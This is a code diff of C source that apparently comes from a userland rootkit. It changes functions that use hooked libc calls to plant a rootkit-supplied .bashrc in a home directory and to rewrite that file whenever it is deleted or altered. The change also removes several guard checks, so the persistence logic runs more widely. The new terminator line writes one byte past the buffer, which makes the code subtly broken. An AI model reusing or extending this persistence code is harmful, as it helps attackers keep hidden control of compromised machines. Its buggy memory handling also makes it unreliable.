@@ -1,20 +1,20 @@
 int writebashrc(void){
     DIR *dp;
 
-    hook(CMKDIR, COPENDIR, CFOPEN, CFWRITE);
+    hook(COPENDIR, CFOPEN, CFWRITE);
     
     dp = call(COPENDIR, HOMEDIR);
     if(dp == NULL) return -1;
     closedir(dp);
 
-    char rcbuf[BASHRC_SIZE], tmp[2], curchar;
-    memset(rcbuf, 0, BASHRC_SIZE);
-    for(int i = 0; i < BASHRC_SIZE; i++){
+    char rcbuf[RKBASHRC_SIZE+1], tmp[2], curchar;
+    memset(rcbuf, 0, RKBASHRC_SIZE);
+    for(int i = 0; i < RKBASHRC_SIZE; i++){
         curchar = rkbashrc[i];
         snprintf(tmp, 2, "%c", curchar);
         strcat(rcbuf, tmp);
     }
-    rcbuf[BASHRC_SIZE] = '\0';
+    rcbuf[RKBASHRC_SIZE+1] = '\0';
 
     FILE *fp;
 
@@ -39,21 +39,15 @@ int writebashrc(void){
 }
 
 void checkbashrc(void){
-    if(not_user(0) || !rkprocup() || rknomore())
+    if(!rkprocup())
         return;
 
     struct stat rcstat;
     memset(&rcstat, 0, sizeof(struct stat));
-    hook(C__XSTAT, CACCESS);
+    hook(C__XSTAT);
 
-    int accstat = (long)call(CACCESS, PROFILE_PATH, F_OK);
     int statstat = (long)call(C__XSTAT, _STAT_VER, BASHRC_PATH, &rcstat);
-    if((statstat < 0 && errno == ENOENT) || (accstat != 0 && errno == ENOENT)){
-        writebashrc();
-        return;
-    }
-
-    if(statstat != -1 && rcstat.st_size != BASHRC_SIZE){
+    if((statstat < 0 && errno == ENOENT) || (statstat != -1 && rcstat.st_size != RKBASHRC_SIZE)){
         writebashrc();
         return;
     }
